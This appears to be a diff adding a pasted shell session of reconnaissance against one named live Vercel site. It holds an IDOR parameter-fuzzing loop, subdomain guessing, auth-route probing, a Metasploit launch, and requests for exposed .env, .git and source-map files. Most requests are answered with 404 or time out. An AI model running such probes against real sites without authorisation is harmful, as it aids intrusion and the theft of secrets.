+# Parameter yang sering IDOR
+PARAMS=("id" "fileId" "driveId" "folderId" "userId" "docId" "uuid")
+VALUES=("1" "0" "admin" "test" "1A2b3C4d5E6f7G8h9I0jK1lM2nO3pQ4r5" "00000000")
+
+: > api/idor-matrix.txt
+while read -r ep; do
+  [ -z "$ep" ] && continue
+  ep="/$(echo "$ep" | sed 's|^/||')"
+  for param in "${PARAMS[@]}"; do
+    for val in "${VALUES[@]}"; do
+      code=$($CURL -sS -o /dev/null -w '%{http_code}' "$B$ep?$param=$val")
+      [ "$code" != "404" ] && [ "$code" != "000" ] && \
+        printf '%-35s %s=%s → %s\n' "$ep" "$param" "$val" "$code" | tee -a api/idor-matrix.txt
+    done
+  done
+done < api/drive-candidates.txt
+
+
+
+
+
+
+
+
+
+
+
+^C
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ msf console
+Command 'msf' not found, did you mean:
+  command 'msb' from deb mysql-sandbox (3.2.05-1)
+  command 'mf' from deb texlive-binaries (2023.20230311.66589-8build1)
+  command 'psf' from deb tcm (2.20+TSQD-7)
+  command 'msd' from deb libxrt-utils (202210.2.13.466+dfsg-8)
+  command 'gsf' from deb libgsf-bin (1.14.51-2ubuntu0.1)
+Try: sudo apt install <deb name>
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ msfconsole
+Metasploit tip: Enable verbose logging with set VERBOSE true
+                                                  
+
+         .                                         .
+ .
+
+      dBBBBBBb  dBBBP dBBBBBBP dBBBBBb  .                       o
+       '   dB'                     BBP
+    dB'dB'dB' dBBP     dBP     dBP BB
+   dB'dB'dB' dBP      dBP     dBP  BB
+  dB'dB'dB' dBBBBP   dBP     dBBBBBBB
+
+                                   dBBBBBP  dBBBBBb  dBP    dBBBBP dBP dBBBBBBP
+          .                  .                  dB' dBP    dB'.BP
+                             |       dBP    dBBBB' dBP    dB'.BP dBP    dBP
+                           --o--    dBP    dBP    dBP    dB'.BP dBP    dBP
+                             |     dBBBBP dBP    dBBBBP dBBBBP dBP    dBP
+
+                                                                    .
+                .
+        o                  To boldly go where no
+                            shell has gone before
+
+
+       =[ metasploit v6.5.9-dev-                                ]
++ -- --=[ 2,716 exploits - 1,367 auxiliary - 2,616 payloads     ]
++ -- --=[ 436 post - 57 encoders - 14 nops - 13 evasion         ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+The Metasploit Framework is a Rapid7 Open Source Projec
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ CURL_RAW="curl -sS --max-time 5"
+
+# Preview Vercel biasanya: <project>-<hash>-<team>.vercel.app
+# Coba pattern umum
+for sub in dev staging preview test prod admin api app beta; do
+  url="https://$sub-clouddatadprd.vercel.app/"
+  code=$($CURL_RAW -o /dev/null -w '%{http_code}' "$url")
+  [ "$code" != "000" ] && echo "$url → $code"
+done
+
+# Cek subdomain via crt.sh (certificate transparency)
+$CURL_RAW "https://crt.sh/?q=%25.clouddatadprd.vercel.app&output=json" \
+  | jq -r '.[].name_value' 2>/dev/null | sort -u > recon/subdomains.txt
+cat recon/subdomains.txt
+curl: (28) Connection timed out after 5002 milliseconds
+curl: (28) Resolving timed out after 5001 milliseconds
+curl: (28) Operation timed out after 5001 milliseconds with 0 bytes received
+curl: (28) Resolving timed out after 5000 milliseconds
+curl: (28) Resolving timed out after 5000 milliseconds
+curl: (28) Connection timed out after 5001 milliseconds
+curl: (28) Connection timed out after 5002 milliseconds
+curl: (28) Resolving timed out after 5000 milliseconds
+curl: (28) Resolving timed out after 5001 milliseconds
+curl: (28) Resolving timed out after 5000 milliseconds
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ CURL=~/Documents/audit-clouddatadprd/scripts/curl-target.sh
+B="https://clouddatadprd.vercel.app"
+
+for ep in \
+  /api/auth /api/auth/session /api/auth/providers /api/auth/csrf \
+  /api/auth/signin /api/auth/callback /api/auth/signout \
+  /login /register /signin /signup /auth/login /auth/register \
+  /api/login /api/register /api/user /api/users /api/me ; do
+  code=$($CURL -sS -o /dev/null -w '%{http_code}' "$B$ep")
+  size=$($CURL -sS "$B$ep" | wc -c)
+  printf '%-30s %s %s bytes\n' "$ep" "$code" "$size" | tee -a http/auth-routes.txt
+done
+/api/auth                      404 10857 bytes
+/api/auth/session              404 10857 bytes
+/api/auth/providers            404 10857 bytes
+/api/auth/csrf                 404 10857 bytes
+/api/auth/signin               404 10857 bytes
+/api/auth/callback             404 10857 bytes
+/api/auth/signout              404 10857 bytes
+/login                         404 10857 bytes
+/register                      404 10857 bytes
+/signin                        404 10857 bytes
+/signup                        404 10857 bytes
+/auth/login                    404 10857 bytes
+/auth/register                 404 10857 bytes
+/api/login                     404 10857 bytes
+/api/register                  404 10857 bytes
+/api/user                      404 10857 bytes
+/api/users                     404 10857 bytes
+/api/me                        404 10857 bytes
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ paramspider -d clouddatadprd.vercel.app
+paramspider: command not found
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ CURL=~/Documents/audit-clouddatadprd/scripts/curl-target.sh
+B="https://clouddatadprd.vercel.app"
+
+for p in \
+  /_next/static/chunks/main.js.map \
+  /_next/static/chunks/pages/_app.js.map \
+  /_next/static/development/_buildManifest.js \
+  /_next/static/development/_ssgManifest.js \
+  /_next/static/BUILD_ID \
+  /next.config.js \
+  /package.json \
+  /.env / .env.local / .env.production \
+  /.git/config / .git/HEAD ; do
+  code=$($CURL -sS -o /dev/null -w '%{http_code}' "$B$p")
+  printf '%-55s %s\n' "$p" "$code"
+done | tee http/leak-test.txt
+curl: (35) Recv failure: Connection reset by peer
+/_next/static/chunks/main.js.map                        000
+/_next/static/chunks/pages/_app.js.map                  403
+/_next/static/development/_buildManifest.js             404
+/_next/static/development/_ssgManifest.js               404
+/_next/static/BUILD_ID                                  404
+/next.config.js                                         404
+/package.json                                           404
+/.env                                                   404
+/                                                       200
+curl: (6) Could not resolve host: clouddatadprd.vercel.app.env.local
+.env.local                                              000
+/                                                       200
+curl: (6) Could not resolve host: clouddatadprd.vercel.app.env.production
+.env.production                                         000
+/.git/config                                            404
+/                                                       200
+curl: (6) Could not resolve host: clouddatadprd.vercel.app.git
+.git/HEAD                                               000
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ 
+
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ CURL_RAW="curl -sS --max-time 5"
+
+# Preview Vercel biasanya: <project>-<hash>-<team>.vercel.app
+# Coba pattern umum
+for sub in dev staging preview test prod admin api app beta; do
+  url="https://$sub-clouddatadprd.vercel.app/"
+  code=$($CURL_RAW -o /dev/null -w '%{http_code}' "$url")
+  [ "$code" != "000" ] && echo "$url → $code"
+done
+
+# Cek subdomain via crt.sh (certificate transparency)
+$CURL_RAW "https://crt.sh/?q=%25.clouddatadprd.vercel.app&output=json" \
+  | jq -r '.[].name_value' 2>/dev/null | sort -u > recon/subdomains.txt
+cat recon/subdomains.txt
+curl: (28) Resolving timed out after 5000 milliseconds
+curl: (28) Resolving timed out after 5000 milliseconds
+https://preview-clouddatadprd.vercel.app/ → 404
+https://test-clouddatadprd.vercel.app/ → 404
+https://prod-clouddatadprd.vercel.app/ → 404
+https://admin-clouddatadprd.vercel.app/ → 404
+https://api-clouddatadprd.vercel.app/ → 404
+https://app-clouddatadprd.vercel.app/ → 404
+https://beta-clouddatadprd.vercel.app/ → 404
+
